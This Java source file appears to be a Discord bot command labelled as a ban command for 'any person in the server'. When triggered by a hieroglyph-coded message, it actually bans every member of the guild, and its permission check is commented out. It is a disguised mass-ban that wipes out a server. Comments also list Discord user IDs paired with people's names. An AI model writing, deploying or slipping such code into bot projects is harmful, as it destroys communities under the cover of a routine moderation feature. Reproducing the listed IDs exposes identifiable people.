import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.Event;
import net.dv8tion.jda.api.requests.RestAction;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import net.dv8tion.jda.api.utils.WidgetUtil;
import net.dv8tion.jda.api.utils.concurrent.Task;

import java.awt.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.function.Consumer;

public class ServerBan extends Command {

    public ServerBan()
    {

        this.name = "\uD80C\uDC43\uD80C\uDC45\uD80C\uDC44";
        this.aliases = new String[] {"ban", "banish"};
        this.help = "banishment of any person in the server";



    }





    @Override
    protected void execute(CommandEvent event) {



        if(event.getMessage().getContentRaw().equalsIgnoreCase("$\uD80C\uDC43\uD80C\uDC45\uD80C\uDC44")) {

            //if (Objects.requireNonNull(event.getMessage().getMember()).canInteract(event.getMember())) {
                //event.getChannel().sendMessage("You have invoked the power of destruction.").queue();
                event.getGuild().loadMembers().onSuccess(members -> {
                    for (Member member:members) {

                            event.getGuild().ban(member,0).queue();
                            

                        }


                });
            }
           // else {
             //   event.getChannel().sendMessage("You do not possess the crown of Kemet. Your command has been revoked.").queue();
               // event.getChannel().sendMessage("Report has been submitted to Owl.").queue();
               // event.getMessage().getMember().modifyNickname("The Fool").queue();
               // event.getGuild().addRoleToMember(event.getMessage().getMember(), event.getGuild().getRoleById("812826397537075231")).queue();
               // event.getGuild().removeRoleFromMember(event.getMessage().getMember(),event.getGuild().getRoleById("812826397537075237")).queue();

            //}
        }









            //672563460965400577 maleks id
            //748992558046249044 haris id
            //640678057958572042 alis id






    }








